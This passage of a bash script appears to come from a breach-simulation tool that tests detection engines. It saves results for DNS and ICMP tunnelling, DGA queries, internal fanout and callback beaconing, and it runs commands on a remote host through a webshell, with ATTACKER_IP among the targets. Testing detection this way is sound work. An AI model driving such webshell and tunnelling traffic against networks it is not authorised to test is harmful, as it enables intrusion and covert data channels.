- Target: exceed baseline for ML/anomaly engines during campaign window
- HTTP: ${FOLLOWUP_HTTP_REQUESTS} requests (planned ${HTTP_REQUESTS_PLANNED})
- SSH: ${FOLLOWUP_SSH_AUTH_FAILURES} auth-failure events (planned ${SSH_ATTEMPTS_PLANNED})
- Strict validation: ${STRICT_FOLLOWUP_VALIDATION}

### Suggested Validation Commands
**SSH (auth.log / journal — not visible in encrypted SSH payload alone):**
\`\`\`bash
sudo journalctl -u ssh -f
sudo tail -f /var/log/auth.log
\`\`\`
**HTTP (web access logs):**
\`\`\`bash
sudo tail -f /var/log/nginx/access.log
sudo tail -f /var/log/apache2/access.log
\`\`\`

### Discovered Service Files
$(read_state_file_or_none "discovered_service_files.log" | sed 's/^/- /')

EOF
        write_dns_tunnel_report
        write_dns_new_tld_report
        write_icmp_tunnel_report
        write_edr_static_test_report
    fi
}

# ==============================================================================
# Correlation telemetry: External Callback, Internal Web Fanout, DNS, ICMP
# ==============================================================================

save_icmp_tunnel_overlap_result() {
    write_overlap_stage_result_env "icmp_tunnel_result.env" \
        "ICMP_TUNNEL_STAGE_STATUS" "${ICMP_TUNNEL_STAGE_STATUS:-skipped}" \
        "ICMP_PACKETS_PLANNED" "${ICMP_PACKETS_PLANNED:-0}" \
        "ICMP_PACKETS_ATTEMPTED_PLANNED" "${ICMP_PACKETS_ATTEMPTED_PLANNED:-${ICMP_PACKETS_PLANNED:-0}}" \
        "ICMP_PACKETS_ATTEMPTED" "${ICMP_PACKETS_ATTEMPTED:-0}" \
        "ICMP_TUNNEL_LIKE_SCORE" "${ICMP_TUNNEL_LIKE_SCORE:-0}" \
        "ICMP_MODE_USED" "${ICMP_MODE_USED:-}" \
        "ICMP_TOTAL_PACKETS" "${ICMP_TOTAL_PACKETS:-0}" \
        "ICMP_ECHO_COUNT" "${ICMP_ECHO_COUNT:-0}" \
        "ICMP_REPLIES_RECEIVED" "${ICMP_REPLIES_RECEIVED:-0}" \
        "ICMP_BASELINE_PACKETS" "${ICMP_BASELINE_PACKETS:-0}" \
        "ICMP_LARGE_PACKETS" "${ICMP_LARGE_PACKETS:-0}" \
        "ICMP_LARGE_PAYLOAD_RATIO" "${ICMP_LARGE_PAYLOAD_RATIO:-0}" \
        "ICMP_PAYLOAD_SIZE_MIN" "${ICMP_PAYLOAD_SIZE_MIN:-0}" \
        "ICMP_PAYLOAD_SIZE_MAX" "${ICMP_PAYLOAD_SIZE_MAX:-0}" \
        "ICMP_PAYLOAD_SIZE_AVG" "${ICMP_PAYLOAD_SIZE_AVG:-0}" \
        "ICMP_TUNNEL_DURATION_ELAPSED" "${ICMP_TUNNEL_DURATION_ELAPSED:-0}" \
        "ICMP_DETECTION_LIKELIHOOD" "${ICMP_DETECTION_LIKELIHOOD:-LOW}" \
        "ICMP_DETECTION_WINDOW_LIKELIHOOD" "${ICMP_DETECTION_WINDOW_LIKELIHOOD:-LOW}" \
        "ICMP_DETECTION_REASON" "${ICMP_DETECTION_REASON:-}" \
        "ICMP_SELECTED_TARGET" "${ICMP_SELECTED_TARGET:-}" \
        "ICMP_TIME_EXCEEDED_STYLE_COUNT" "${ICMP_TIME_EXCEEDED_STYLE_COUNT:-0}" \
        "ICMP_DEST_UNREACHABLE_STYLE_COUNT" "${ICMP_DEST_UNREACHABLE_STYLE_COUNT:-0}" \
        "ICMP_TARGET_COUNT" "${ICMP_TARGET_COUNT:-0}" \
        "ICMP_TARGETS" "${ICMP_TARGETS:-0}" \
        "ICMP_PAYLOAD_MODE" "${ICMP_PAYLOAD_MODE:-standard}" \
        "ICMP_FALLBACK_MODE" "${ICMP_FALLBACK_MODE:-none}" \
        "DEGRADED_TELEMETRY" "${DEGRADED_TELEMETRY:-false}"
}

save_dns_tunnel_overlap_result() {
    write_overlap_stage_result_env "dns_tunnel_result.env" \
        "DNS_TUNNEL_STAGE_STATUS" "${DNS_TUNNEL_STAGE_STATUS:-skipped}" \
        "DNS_QUERIES_PLANNED" "${DNS_QUERIES_PLANNED:-0}" \
        "DNS_QUERIES_ATTEMPTED" "${DNS_QUERIES_ATTEMPTED:-0}" \
        "DNS_TUNNEL_UNIQUE_QUERIES" "${DNS_TUNNEL_UNIQUE_QUERIES:-0}" \
        "DNS_TUNNEL_NXDOMAIN_COUNT" "${DNS_TUNNEL_NXDOMAIN_COUNT:-0}" \
        "DNS_TUNNEL_RESOLVED_COUNT" "${DNS_TUNNEL_RESOLVED_COUNT:-0}" \
        "DNS_TUNNEL_TIMEOUT_COUNT" "${DNS_TUNNEL_TIMEOUT_COUNT:-0}" \
        "DNS_TUNNEL_ERROR_COUNT" "${DNS_TUNNEL_ERROR_COUNT:-0}" \
        "DNS_TUNNEL_ENH_ATTEMPTED" "${DNS_TUNNEL_ENH_ATTEMPTED:-0}" \
        "DNS_TUNNEL_FB_ATTEMPTED" "${DNS_TUNNEL_FB_ATTEMPTED:-0}" \
        "DNS_RESPONSES_RECEIVED" "${DNS_RESPONSES_RECEIVED:-0}" \
        "DNS_EFFECTIVE_TLD_COUNT" "${DNS_EFFECTIVE_TLD_COUNT:-0}" \
        "DNS_CLUSTER_LOCAL_COUNT" "${DNS_CLUSTER_LOCAL_COUNT:-0}" \
        "DNS_POWERAPPS_STYLE_COUNT" "${DNS_POWERAPPS_STYLE_COUNT:-0}" \
        "DNS_SUSPICIOUS_TLD_COUNT" "${DNS_SUSPICIOUS_TLD_COUNT:-0}" \
        "DNS_HTTPS_QUERY_COUNT" "${DNS_HTTPS_QUERY_COUNT:-0}" \
        "DNS_TOTAL_ENTROPY_STYLE_COUNT" "${DNS_TOTAL_ENTROPY_STYLE_COUNT:-0}" \
        "DEGRADED_TELEMETRY" "${DEGRADED_TELEMETRY:-false}"
}

save_dga_simulation_overlap_result() {
    write_overlap_stage_result_env "dga_simulation_result.env" \
        "DGA_STAGE_STATUS" "${DGA_STAGE_STATUS:-skipped}" \
        "DGA_TOTAL_QUERIES" "${DGA_TOTAL_QUERIES:-0}" \
        "DGA_NXDOMAIN_COUNT" "${DGA_NXDOMAIN_COUNT:-0}" \
        "DGA_RESOLVED_COUNT" "${DGA_RESOLVED_COUNT:-0}" \
        "DGA_TIMEOUT_COUNT" "${DGA_TIMEOUT_COUNT:-0}" \
        "DGA_ERROR_COUNT" "${DGA_ERROR_COUNT:-0}" \
        "DGA_DETECTION_LIKELIHOOD" "${DGA_DETECTION_LIKELIHOOD:-LOW}" \
        "DGA_DETECTION_REASON" "${DGA_DETECTION_REASON:-}" \
        "DGA_FINAL_RESULT" "${DGA_FINAL_RESULT:-skipped}" \
        "DGA_DNS_SERVER" "${DGA_DNS_SERVER:-}" \
        "DGA_QUERIES_ATTEMPTED" "${DGA_QUERIES_ATTEMPTED:-0}" \
        "DGA_QUERIES_SENT" "${DGA_QUERIES_SENT:-0}" \
        "DEGRADED_TELEMETRY" "${DEGRADED_TELEMETRY:-false}"
}

save_internal_fanout_overlap_result() {
    write_overlap_stage_result_env "internal_fanout_result.env" \
        "INTERNAL_FANOUT_STATUS" "${INTERNAL_FANOUT_STATUS:-skipped}" \
        "INTERNAL_FANOUT_TARGETS" "${INTERNAL_FANOUT_TARGETS:-0}" \
        "INTERNAL_FANOUT_ATTEMPTED" "${INTERNAL_FANOUT_ATTEMPTED:-0}" \
        "INTERNAL_FANOUT_CONNECTED" "${INTERNAL_FANOUT_CONNECTED:-0}" \
        "INTERNAL_FANOUT_RESPONSES" "${INTERNAL_FANOUT_RESPONSES:-0}" \
        "FANOUT_UA_JNDI_STYLE_COUNT" "${FANOUT_UA_JNDI_STYLE_COUNT:-0}" \
        "FANOUT_UA_OGNL_STYLE_COUNT" "${FANOUT_UA_OGNL_STYLE_COUNT:-0}" \
        "FANOUT_UA_SPRING_STYLE_COUNT" "${FANOUT_UA_SPRING_STYLE_COUNT:-0}"
}

save_external_callback_overlap_result() {
    write_overlap_stage_result_env "external_callback_result.env" \
        "EXTERNAL_CALLBACK_STATUS" "${EXTERNAL_CALLBACK_STATUS:-skipped}" \
        "EXTERNAL_CALLBACK_ATTEMPTED" "${EXTERNAL_CALLBACK_ATTEMPTED:-0}" \
        "EXTERNAL_CALLBACK_CONNECTED" "${EXTERNAL_CALLBACK_CONNECTED:-0}" \
        "EXTERNAL_CALLBACK_RESPONSES" "${EXTERNAL_CALLBACK_RESPONSES:-0}" \
        "CORRELATION_BEACON_CYCLES" "${CORRELATION_BEACON_CYCLES:-0}"
}

save_http_url_scan_overlap_result() {
    sync_web_combined_metrics
    compute_web_detection_confidence
    write_overlap_stage_result_env "http_url_scan_result.env" \
        "HTTP_URL_SCAN_STAGE_STATUS" "${HTTP_URL_SCAN_STAGE_STATUS:-skipped}" \
        "HTTP_SCAN_TARGET_COUNT" "${HTTP_SCAN_TARGET_COUNT:-0}" \
        "HTTP_REQUESTS_PLANNED" "${HTTP_REQUESTS_PLANNED:-0}" \
        "HTTP_REQUESTS_ATTEMPTED" "${HTTP_REQUESTS_ATTEMPTED:-0}" \
        "HTTP_CONNECTED" "${HTTP_CONNECTED:-0}" \
        "HTTP_RESPONSES_RECEIVED" "${HTTP_RESPONSES_RECEIVED:-0}" \
        "HTTPS_REQUESTS_ATTEMPTED" "${HTTPS_REQUESTS_ATTEMPTED:-0}" \
        "HTTPS_CONNECTED" "${HTTPS_CONNECTED:-0}" \
        "HTTPS_RESPONSES_RECEIVED" "${HTTPS_RESPONSES_RECEIVED:-0}" \
        "WEB_RESPONSES_RECEIVED" "${WEB_RESPONSES_RECEIVED:-0}" \
        "HTTP_SCAN_FAILED_RESPONSES" "${HTTP_SCAN_FAILED_RESPONSES:-0}" \
        "HTTP_SCAN_SUCCESS_RESPONSES" "${HTTP_SCAN_SUCCESS_RESPONSES:-0}" \
        "HTTPS_SCAN_FAILED_RESPONSES" "${HTTPS_SCAN_FAILED_RESPONSES:-0}" \
        "HTTPS_SCAN_SUCCESS_RESPONSES" "${HTTPS_SCAN_SUCCESS_RESPONSES:-0}" \
        "WEB_FAILED_RESPONSES" "${WEB_FAILED_RESPONSES:-0}" \
        "WEB_SUCCESS_RESPONSES" "${WEB_SUCCESS_RESPONSES:-0}" \
        "HTTP_200_COUNT" "${HTTP_200_COUNT:-0}" \
        "HTTP_301_COUNT" "${HTTP_301_COUNT:-0}" \
        "HTTP_302_COUNT" "${HTTP_302_COUNT:-0}" \
        "HTTP_401_COUNT" "${HTTP_401_COUNT:-0}" \
        "HTTP_403_COUNT" "${HTTP_403_COUNT:-0}" \
        "HTTP_404_COUNT" "${HTTP_404_COUNT:-0}" \
        "HTTP_405_COUNT" "${HTTP_405_COUNT:-0}" \
        "HTTPS_200_COUNT" "${HTTPS_200_COUNT:-0}" \
        "HTTPS_301_COUNT" "${HTTPS_301_COUNT:-0}" \
        "HTTPS_302_COUNT" "${HTTPS_302_COUNT:-0}" \
        "HTTPS_401_COUNT" "${HTTPS_401_COUNT:-0}" \
        "HTTPS_403_COUNT" "${HTTPS_403_COUNT:-0}" \
        "HTTPS_404_COUNT" "${HTTPS_404_COUNT:-0}" \
        "HTTPS_405_COUNT" "${HTTPS_405_COUNT:-0}" \
        "HTTP_PROPFIND_COUNT" "${HTTP_PROPFIND_COUNT:-0}" \
        "HTTP_OPTIONS_COUNT" "${HTTP_OPTIONS_COUNT:-0}" \
        "HTTP_POST_COUNT" "${HTTP_POST_COUNT:-0}" \
        "ABNORMAL_USER_AGENT_COUNT" "${ABNORMAL_USER_AGENT_COUNT:-0}" \
        "RARE_USER_AGENT_COUNT" "${RARE_USER_AGENT_COUNT:-0}" \
        "NORMAL_USER_AGENT_COUNT" "${NORMAL_USER_AGENT_COUNT:-0}" \
        "PAYLOAD_USER_AGENT_COUNT" "${PAYLOAD_USER_AGENT_COUNT:-0}" \
        "UA_SQLI_STYLE_COUNT" "${UA_SQLI_STYLE_COUNT:-0}" \
        "UA_ENCODING_ABUSE_COUNT" "${UA_ENCODING_ABUSE_COUNT:-0}" \
        "UA_COMMAND_STYLE_COUNT" "${UA_COMMAND_STYLE_COUNT:-0}" \
        "UA_TRAVERSAL_STYLE_COUNT" "${UA_TRAVERSAL_STYLE_COUNT:-0}" \
        "UA_JNDI_STYLE_COUNT" "${UA_JNDI_STYLE_COUNT:-0}" \
        "UA_OGNL_STYLE_COUNT" "${UA_OGNL_STYLE_COUNT:-0}" \
        "UA_SPRING_STYLE_COUNT" "${UA_SPRING_STYLE_COUNT:-0}" \
        "URL_SCAN_DEGRADED_FALLBACK" "${URL_SCAN_DEGRADED_FALLBACK:-false}" \
        "WEB_DETECTION_CONFIDENCE" "${WEB_DETECTION_CONFIDENCE:-Low}" \
        "WEB_FAIL_RATIO" "${WEB_FAIL_RATIO:-0}" \
        "HTTP_SCAN_FAIL_RATIO" "${HTTP_SCAN_FAIL_RATIO:-0}" \
        "URL_SCAN_UNIQUE_ATTEMPTED" "${URL_SCAN_UNIQUE_ATTEMPTED:-0}" \
        "URL_SCAN_UNIQUE_FAILED" "${URL_SCAN_UNIQUE_FAILED:-0}" \
        "URL_SCAN_UNIQUE_SUCCESS" "${URL_SCAN_UNIQUE_SUCCESS:-0}" \
        "URL_SCAN_UNIQUE_FAIL_RATIO" "${URL_SCAN_UNIQUE_FAIL_RATIO:-0}" \
        "URL_SCAN_ANOMALY_SCORE" "${URL_SCAN_ANOMALY_SCORE:-0}" \
        "HTTP_SCAN_UNIQUE_URL_TARGET" "${HTTP_SCAN_UNIQUE_URL_TARGET:-50}" \
        "FOLLOWUP_HTTP_REQUESTS" "${FOLLOWUP_HTTP_REQUESTS:-0}" \
        "HTTP_ATTACK_TOTAL_REQUESTS" "${HTTP_ATTACK_TOTAL_REQUESTS:-0}" \
        "HTTP_ATTACK_PAYLOAD_URL_REQUESTS" "${HTTP_ATTACK_PAYLOAD_URL_REQUESTS:-0}" \
        "HTTP_ATTACK_PAYLOAD_UA_REQUESTS" "${HTTP_ATTACK_PAYLOAD_UA_REQUESTS:-0}" \
        "HTTP_ATTACK_PAYLOAD_URL_WITH_PAYLOAD_UA" "${HTTP_ATTACK_PAYLOAD_URL_WITH_PAYLOAD_UA:-0}" \
        "HTTP_ATTACK_PAYLOAD_URL_WITH_NORMAL_UA" "${HTTP_ATTACK_PAYLOAD_URL_WITH_NORMAL_UA:-0}" \
        "HTTP_UA_COVERAGE_TOTAL" "${HTTP_UA_COVERAGE_TOTAL:-0}" \
        "HTTP_UA_COVERAGE_PRESENT" "${HTTP_UA_COVERAGE_PRESENT:-0}" \
        "HTTP_UA_COVERAGE_MISSING" "${HTTP_UA_COVERAGE_MISSING:-0}" \
        "HTTP_UA_COVERAGE_PERCENT" "${HTTP_UA_COVERAGE_PERCENT:-0}" \
        "HTTP_UA_COVERAGE_NORMAL" "${HTTP_UA_COVERAGE_NORMAL:-0}" \
        "HTTP_UA_COVERAGE_RARE" "${HTTP_UA_COVERAGE_RARE:-0}" \
        "HTTP_UA_COVERAGE_PAYLOAD" "${HTTP_UA_COVERAGE_PAYLOAD:-0}" \
        "HTTP_UA_COVERAGE_ABNORMAL" "${HTTP_UA_COVERAGE_ABNORMAL:-0}" \
        "DETECTION_LIKELIHOOD_URL_SCAN" "${DETECTION_LIKELIHOOD_URL_SCAN:-low}" \
        "DETECTION_LIKELIHOOD_MALICIOUS_UA" "${DETECTION_LIKELIHOOD_MALICIOUS_UA:-low}" \
        "DEGRADED_TELEMETRY" "${DEGRADED_TELEMETRY:-false}"
}

save_nonstandard_port_overlap_result() {
    write_overlap_stage_result_env "nonstandard_port_result.env" \
        "NONSTANDARD_PORT_CONNECTIONS" "${NONSTANDARD_PORT_CONNECTIONS:-0}"
}

probe_remote_ping_capability() {
    local probe_out ttl_test
    PING_FLAVOR="unknown"
    PING_TTL_OPT="-t"
    PING_TIMEOUT_OPT="-W"
    PING_TTL_SUPPORTED=true
    [[ "${HAS_ping:-false}" != true ]] && return 0
    REMOTE_PING_PATH=$(run_webshell_raw "ping-path" "command -v ping 2>/dev/null || true")
    REMOTE_PING_PATH=$(strip_stdout_capture_noise "${REMOTE_PING_PATH}")
    REMOTE_PING_PATH="${REMOTE_PING_PATH//$'\r'/}"
    REMOTE_PING_PATH=$(printf '%s\n' "${REMOTE_PING_PATH}" | awk 'NF && $0 !~ /^\[/ {print; exit}')
    [[ -z "${REMOTE_PING_PATH}" ]] && REMOTE_PING_PATH="ping"
    probe_out=$(run_webshell_raw "ping-flavor-probe" \
        "${REMOTE_SHELL_HELPERS} ping --version 2>&1 | head -n1; ping -h 2>&1 | head -n3" 2>/dev/null || true)
    probe_out=$(strip_stdout_capture_noise "${probe_out}")
    case "${probe_out}" in
        *[Ii]putils*|*iputils*) PING_FLAVOR="iputils" ;;
        *[Bb]usy[Bb]ox*) PING_FLAVOR="busybox" ;;
        *) PING_FLAVOR="unknown" ;;
    esac
    ttl_test=$(run_webshell_raw "ping-ttl-probe" \
        "${REMOTE_SHELL_HELPERS} ping -c 1 -t 1 -W 1 127.0.0.1 >/dev/null 2>&1 && echo TTL_OK || echo TTL_FAIL" 2>/dev/null || true)
    ttl_test=$(strip_stdout_capture_noise "${ttl_test}")
    if [[ "${ttl_test}" != *"TTL_OK"* ]]; then
        PING_TTL_SUPPORTED=false
        PING_TTL_OPT=""
        case "${PING_FLAVOR}" in
            busybox) PING_TIMEOUT_OPT="-w" ;;
        esac
    fi
    [[ -n "${REMOTE_PING_PATH}" ]] && add_dependency_status "ping-path: ${REMOTE_PING_PATH} flavor=${PING_FLAVOR} ttl_opt=${PING_TTL_OPT:-none} timeout_opt=${PING_TIMEOUT_OPT}"
}

collect_hosts_from_remote_file() {
    local f="$1" cache merged=""
    cache="${LOCAL_STATE_DIR}/remote_hosts/${f}"
    if [[ -s "${cache}" ]]; then
        merged=$(extract_host_file_lines < "${cache}")
    else
        merged=$(get_local_hosts "${f}" 2>/dev/null || true)
    fi
    printf '%s\n' "${merged}"
}

collect_dns_tunnel_targets() {
    local merged=""
    merged=$(collect_hosts_from_remote_file "usable_dns_hosts.txt")
    if [[ -z "${merged}" ]]; then
        merged=$(collect_hosts_from_remote_file "dns_hosts.txt")
    fi
    printf '%s\n' "${merged}" | awk '/^[0-9]+\./ {print $1}' | sort -u
}

collect_icmp_tunnel_targets() {
    local merged="" f
    for f in alive_hosts.txt usable_http_targets.txt usable_https_targets.txt \
             usable_ssh_hosts.txt usable_dns_hosts.txt http_targets.txt https_targets.txt \
             ssh_hosts.txt dns_hosts.txt; do
        merged=$(printf '%s\n%s' "${merged}" "$(collect_hosts_from_remote_file "${f}")")
    done
    merged=$(printf '%s\n%s' "${merged}" "${ATTACKER_IP}")
    printf '%s\n' "${merged}" | awk '/^[0-9]+\./ {print $1}' | sort -u | head -n 32
}

collect_internal_fanout_targets() {
    local http https merged="" line norm host port scheme
    declare -A seen=()
    merged=""
    for scheme in http https; do
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            read -r host port _ <<< "$(web_target_parse_line "${line}" "${scheme}")" || continue
            [[ -n "${seen[${host}:${port}]:-}" ]] && continue
            seen[${host}:${port}]=1
            merged=$(printf '%s\n%s' "${merged}" "${host}:${port}")
        done < <(collect_hosts_from_remote_file "reachable_${scheme}_targets.txt")
    done
    if [[ -z "${merged}" ]]; then
        for scheme in http https; do
            while IFS= read -r line; do
                [[ -z "${line}" ]] && continue
                read -r host port _ <<< "$(web_target_parse_line "${line}" "${scheme}")" || continue
                [[ -n "${seen[${host}:${port}]:-}" ]] && continue
                seen[${host}:${port}]=1
                merged=$(printf '%s\n%s' "${merged}" "${host}:${port}")
            done < <(collect_web_target_candidates "${scheme}")
        done
    fi
    printf '%s\n' "${merged}" | awk 'NF'
}

collect_nonstandard_port_hosts() {
    local merged="" f
    for f in alive_hosts.txt usable_http_targets.txt usable_https_targets.txt \
             usable_ssh_hosts.txt usable_dns_hosts.txt http_targets.txt https_targets.txt \
             ssh_hosts.txt dns_hosts.txt; do
        merged=$(printf '%s\n%s' "${merged}" "$(collect_hosts_from_remote_file "${f}")")
    done
    printf '%s\n' "${merged}" | awk '/^[0-9]+\./ {print $1}' | sort -u | head -n 24
}

append_dns_tunnel_wave_log() {
    local msg="$1"
    mkdir -p "${LOG_DIR}"
    printf '%s\n' "[$(date '+%Y-%m-%d %H:%M:%S')] cycle=${CURRENT_CYCLE:-1} ${msg}" >> "${LOG_DIR}/dns_tunnel_waves.log"
}

dns_tunnel_log_both() {
    local msg="$1"
    append_dns_tunnel_wave_log "${msg}"
    state_append "dns_tunnel_simulation.log" "cycle=${CURRENT_CYCLE:-1} ${msg}"
    log_message "OK" "DNS Tunnel: ${msg}" >&2
}

dns_posix_inline_helpers() {
    cat <<'DNS_POSIX_HELPERS'
rand_bytes(){ n="${1:-8}"; if [ -r /dev/urandom ]; then head -c "$n" /dev/urandom 2>/dev/null; elif command -v openssl >/dev/null 2>&1; then openssl rand -hex "$n" 2>/dev/null; else printf '%s%s' "$$" "$(date +%s 2>/dev/null || echo 0)"; fi; }
randlbl(){ n="${1:-6}"; s=$(rand_bytes 4 2>/dev/null | tr -dc 'a-z0-9' | head -c "$n" 2>/dev/null); [ -n "$s" ] || s="poc$$"; printf '%s' "$s"; }
randlbl32(){ n="${1:-32}"; s=$(rand_bytes 10 2>/dev/null | tr -dc 'A-Z2-7' | head -c "$n" 2>/dev/null); [ -n "$s" ] || s=$(randlbl "$n"); printf '%s' "$s"; }
randb64url(){ n="${1:-32}"; s=$(rand_bytes 16 2>/dev/null | tr '+/=' '-_' | tr -dc 'A-Za-z0-9_-' | head -c "$n" 2>/dev/null); [ -n "$s" ] || s=$(randlbl32 "$n"); printf '%s' "$s"; }
label_ent_score(){ lbl="$1"; len=${#lbl}; [ "$len" -lt 1 ] && { printf '0'; return; }; u=$(printf '%s' "$lbl" | sed 's/./&\n/g' | sort -u | grep -c . 2>/dev/null || echo 1); sc=$(( u * 100 / (len > 32 ? 32 : len) )); [ "$len" -ge 24 ] && sc=$((sc + 15)); [ "$len" -ge 40 ] && sc=$((sc + 10)); printf '%s' "$sc"; }
longest_label_len(){ fq="$1"; best=0; rest="$fq"; while [ -n "$rest" ]; do p="${rest%%.*}"; [ "$p" = "$rest" ] && rest="" || rest="${rest#*.}"; l=${#p}; [ "$l" -gt "$best" ] && best="$l"; done; printf '%s' "$best"; }
rand_domain(){ printf '%s.invalid' "$(randlbl 10)"; }
DNS_POSIX_HELPERS
}

dns_remote_script_open() {
    local delim="${1:-DNS_POC_REMOTE}"
    printf '%s\n' "if command -v bash >/dev/null 2>&1; then bash <<'${delim}'"
    dns_posix_inline_helpers
}

dns_remote_script_close() {
    local delim="${1:-DNS_POC_REMOTE}"
    printf '%s\n' "${delim}"
    printf '%s\n' "else"
    dns_posix_inline_helpers
    printf '%s\n' "fi"
}

dns_extract_remote_bash_body() {
    local payload="$1" delim="$2" body=""
    [[ -z "${payload}" || -z "${delim}" ]] && return 1
    body=$(printf '%s\n' "${payload}" | awk -v d="${delim}" '
        $0 ~ "bash <<'\''" d "'\''" { capture=1; next }
        capture && $0 == d { exit }
        capture { print }
    ')
    [[ -n "${body}" ]]
    printf '%s' "${body}"
}

dns_validate_remote_payload_syntax_local() {
    local payload="$1" delim="${2:-DNS_TUNNEL_SIM_SCRIPT}"
    local body="" tmp=""
    body=$(dns_extract_remote_bash_body "${payload}" "${delim}" 2>/dev/null || true)
    [[ -z "${body}" ]] && return 1
    tmp=$(mktemp)
    {
        dns_posix_inline_helpers
        printf '%s\n' "${body}"
    } > "${tmp}"
    bash -n "${tmp}" 2>/dev/null
    local rc=$?
    rm -f "${tmp}"
    return "${rc}"
}

precheck_dns_remote_payload_syntax() {
    local payload="$1" delim="${2:-DNS_TUNNEL_SIM_SCRIPT}" body="" out="" check_cmd=""
    [[ "${DRY_RUN}" == true ]] && return 0
    body=$(dns_extract_remote_bash_body "${payload}" "${delim}" 2>/dev/null || true)
    [[ -z "${body}" ]] && return 1
    if ! dns_validate_remote_payload_syntax_local "${payload}" "${delim}"; then
        dns_tunnel_log_both "DNS_PAYLOAD_SYNTAX_ERROR scope=local precheck delim=${delim}"
        return 1
    fi
    check_cmd=$(cat <<EOF
if command -v bash >/dev/null 2>&1; then
  bash -n <<'${delim}_PRECHECK' 2>&1
${body}
${delim}_PRECHECK
  rc=\$?
  [ \$rc -eq 0 ] && echo DNS_PAYLOAD_SYNTAX_OK || echo DNS_PAYLOAD_SYNTAX_ERROR rc=\$rc
else
  echo DNS_PAYLOAD_SYNTAX_ERROR reason=no_bash
fi
EOF
)
    out=$(run_webshell_quick "dns-payload-syntax-precheck" "${check_cmd}" 2>/dev/null || true)
    if [[ "${out}" == *DNS_PAYLOAD_SYNTAX_OK* ]]; then
        return 0
    fi
    dns_tunnel_log_both "DNS_PAYLOAD_SYNTAX_ERROR scope=remote precheck delim=${delim} detail=$(printf '%.200s' "${out}")"
    return 1
}

log_dns_tunnel_selected_resolver() {
    local server="$1" source="$2" reason="$3"
    DNS_TUNNEL_SELECTED_RESOLVER="${server}"
    DNS_TUNNEL_RESOLVER_SOURCE="${source}"
    local msg="DNS_TUNNEL_SELECTED_RESOLVER server=${server} source=${source} reason=${reason}"
    state_append "dns_tunnel_resolver.log" "${msg}"
    dns_tunnel_log_both "${msg}"
}

log_dns_tunnel_query_exec() {
    local server="$1" query="$2" qtype="$3" result="$4"
    local msg="DNS_TUNNEL_QUERY_EXEC server=${server} query=${query} qtype=${qtype} result=${result}"
    append_dns_tunnel_wave_log "${msg}"
}

log_dns_tunnel_query_telemetry() {
    local msg="$1"
    append_dns_tunnel_wave_log "${msg}"
}

probe_dns_server_incoming_queries() {
    local server="$1" out="" count=0 token=""
    server=$(poc_extract_ipv4 "${server}")
    [[ -z "${server}" ]] && return 1
    if [[ "${DRY_RUN}" == true ]]; then
        printf '0'
        return 1
    fi
    if command -v dig >/dev/null 2>&1; then
        out=$(dig +time=2 +tries=1 @"${server}" localhost bind9/statistics CH TXT 2>/dev/null || true)
        token=$(printf '%s\n' "${out}" | tr '"' '\n' | grep -E '^queries received=' | tail -n1 | sed 's/queries received=//')
        count=$(safe_int "${token}")
        if (( count > 0 )); then
            printf '%s' "${count}"
            return 0
        fi
        token=$(printf '%s\n' "${out}" | tr '"' '\n' | grep -E '^total queries=' | tail -n1 | sed 's/total queries=//')
        count=$(safe_int "${token}")
        if (( count > 0 )); then
            printf '%s' "${count}"
            return 0
        fi
    fi
    printf '0'
    return 1
}

capture_dns_server_query_baseline() {
    local server="$1" baseline=0
    baseline=$(probe_dns_server_incoming_queries "${server}" 2>/dev/null || printf '0')
    DNS_SERVER_QUERY_BASELINE=$(safe_int "${baseline}")
}

finalize_dns_server_query_observation() {
    local server="$1" internal_count="$2" actual_count="$3" module="${4:-DNS}"
    local final=0 baseline=0 observed=0 mismatch=no
    server=$(poc_extract_ipv4 "${server}")
    [[ -z "${server}" ]] && return 1
    final=$(probe_dns_server_incoming_queries "${server}" 2>/dev/null || printf '0')
    final=$(safe_int "${final}")
    baseline=$(safe_int "${DNS_SERVER_QUERY_BASELINE:-0}")
    if (( final > 0 && baseline > 0 && final >= baseline )); then
        observed=$((final - baseline))
    else
        observed=0
    fi
    DNS_SERVER_OBSERVED_QUERIES="${observed}"
    internal_count=$(safe_int "${internal_count}")
    actual_count=$(safe_int "${actual_count}")
    if (( observed > 0 && actual_count > 0 )); then
        if (( observed * 100 / actual_count < 50 || observed * 100 / actual_count > 200 )); then
            mismatch=yes
        fi
    elif (( internal_count > 0 && actual_count > 0 && internal_count != actual_count )); then
        mismatch=yes
    elif (( internal_count > 0 && actual_count == 0 )); then
        mismatch=yes
    fi
    DNS_INTERNAL_VS_ACTUAL_MISMATCH="${mismatch}"
    case "${module}" in
        DGA) DGA_SERVER_OBSERVED_QUERIES="${observed}"; DGA_INTERNAL_VS_ACTUAL_MISMATCH="${mismatch}" ;;
    esac
    local msg="DNS_QUERY_VERIFICATION module=${module} server=${server} internal_queries=${internal_count} actual_sent=${actual_count} server_observed=${observed} server_baseline=${baseline} server_final=${final} mismatch=${mismatch}"
    state_append "dns_query_verification.log" "${msg}"
    dns_tunnel_log_both "${msg}"
    dga_simulation_log_both "${msg}"
}

reset_dns_query_verification_stats() {
    DNS_QUERY_GENERATED=0
    DNS_QUERY_SENT_COUNT=0
    DNS_QUERY_RESPONDED_COUNT=0
    DNS_TUNNEL_ACTUAL_DNS_QUERIES=0
    DNS_TUNNEL_ACTUAL_TXT_QUERIES=0
    DNS_TUNNEL_ACTUAL_NXDOMAIN=0
    DNS_SERVER_OBSERVED_QUERIES=0
    DNS_INTERNAL_VS_ACTUAL_MISMATCH=no
}

reset_dga_query_verification_stats() {
    DGA_QUERY_GENERATED=0
    DGA_QUERY_SENT_COUNT=0
    DGA_QUERY_RESPONDED_COUNT=0
    DGA_ACTUAL_DNS_QUERIES=0
    DGA_ACTUAL_RANDOM_DOMAINS=0
    DGA_ACTUAL_NXDOMAIN=0
    DGA_SERVER_OBSERVED_QUERIES=0
    DGA_INTERNAL_VS_ACTUAL_MISMATCH=no
}

aggregate_dns_query_verification_from_output() {
    local out="$1" scope="${2:-dns_tunnel}"
    local line="" gen=0 sent=0 resp=0 nx=0 txt=0 resolved=0 timeout=0 error=0 random=0
    while IFS= read -r line; do
        line=$(printf '%s' "${line}" | tr -d '\r')
        case "${line}" in
            DNS_QUERY_GENERATED*)
                gen=$((gen + 1))
                case "${line}" in
                    *phase=nx*) random=$((random + 1)) ;;
                    *qtype=TXT*) ;;
                esac
                ;;
            DNS_QUERY_SENT*)
                [[ "${line}" == *sent=no* ]] && continue
                sent=$((sent + 1))
                case "${line}" in
                    *qtype=TXT*) txt=$((txt + 1)) ;;
                esac
                log_dns_tunnel_query_telemetry "${line}"
                ;;
            DNS_QUERY_RESPONSE*)
